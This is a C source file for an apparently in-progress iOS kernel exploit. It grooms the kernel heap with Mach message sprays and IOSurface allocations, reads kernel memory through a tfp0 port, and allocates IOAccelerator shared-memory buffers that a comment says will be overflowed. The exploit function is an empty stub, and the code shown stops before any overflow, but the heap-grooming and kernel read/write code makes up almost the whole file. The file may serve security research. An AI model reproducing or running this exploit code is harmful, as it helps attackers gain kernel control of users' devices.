#include <stdio.h>

#include "print.h"
#include "ioaccel.h"
#include "iosurface.h"
#include "exploit_utilities.h"
#include "exploit.h"

// helper
#include "helper/krw.h"
#include "helper/offsets.h"
#include "helper/kexecute.h"
#include "helper/find_port.h"
#include "helper/find_shmem.h"
#include "helper/find_IOSurface.h"

extern mach_port_t tfp0;

// Kernel Page Size.
extern mach_vm_size_t pagesize;

int exploit(void) {

	return 0;
}

int main(int argc, char *argv[], char *envp[]) {
    int ret = 0;

	IOAccelerator_init();
	IOSurface_init();

    // helper
    offsets_init();
	init_tfp0(); 
	INFO("tfp0: 0x%" PRIx32 "\n", tfp0);

	int r = get_kbase(&kbase);
    INFO("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);
    //

    void *data = NULL;
	mach_port_t ports[port_cnt] = {};

	// setup 200 ports for later use
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
		// INFO("got new_mach_port[%d]: 0x%x\n", i, ports[i]);
    }

	int port_i = 0;
#define POP_PORT() ports[port_i++]

// ----------- heap pre-exploit setup ----------- //
    INFO("Doing stage 0 heap setup\n");

	// fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();

        //helper; set signature
        if((i % 2) == 0) {memset(data, 0x74, msg_size);}
        else {memset(data, 0x72, msg_size);}

        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            
            if (ret) {
                ERROR("Failed to send message\n");
                goto err;
            }
        }

        //helper; obtain msgdata_kptr
        uint64_t kmsgdata_kptr = find_kmsgdata_from_port(saved_ports[i]);
        INFO("saved_ports[%d](port=0x%x)'s msgdata_kptr = 0x%llx\n", i, saved_ports[i], kmsgdata_kptr);
    }
    
    
    free(data);
    data = NULL;

    // getchar();

    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);

    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    
    //helper; set signature
    memset(data, 0x81, msg_size);

    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {  //MACH_PORT_QLIMIT_LARGE = (1024)
        kern_return_t ret = send_message(spray, data, msg_size);
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }

    //helper; obtain msgdata_kptr 
    uint64_t kmsgdata_kptr = find_kmsgdata_from_port(spray);
    INFO("spray(port=0x%x)'s msgdata_kptr = 0x%llx\n", spray, kmsgdata_kptr);
    // getchar();
    //

    // ----------- heap stage 1 setup -----------//
    
    INFO("Doing stage 1 heap setup\n");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        ERROR("Failed to allocate empty kalloc buffer (ret: 0x%x, %s)\n", ret, mach_error_string(ret));
        goto err;
    }

    //helper; find our sprayed IOSurface data
    uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("IOSurface's userspaceValueDicts: 0x%llx\n", userspaceValueDicts);
    getchar();
    struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
			INFO("OSArray from dict[%u]: 0x%llx\n\n", i, dict->items[i].value);

            uint32_t osarray_count = kread32(dict->items[i].value + 0x14);	// 0x14 = p/x offsetof(OSArray, count)
	        uint32_t osarray_capacity = kread32(dict->items[i].value + 0x18);	// 0x18 = p/x offsetof(OSArray, capacity)

            printf("osarray_count 0x%x, osarray_capacity: 0x%x\n", osarray_count, osarray_capacity);

            if(osarray_capacity == (82 MB / 0x10)) {
                puts("Found!!!");
            }
		}
    }
    

    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    ret = alloc_shmem(96 MB, &cmdbuf, &seglist);
    if (ret) {
        ERROR("Failed to allocate shared memory\n");
        goto err;
    }

err:
	// clean 200 ports
	for (int i = 0; i < port_cnt; i++) {
        if (ports[i] /*&& ports[i] != new_tfp0*/) mach_port_destroy(mach_task_self(), ports[i]);
    }

    if (data) free(data);
	
	IOAccelerator_deinit();
	IOSurface_deinit();
	return 0;
}
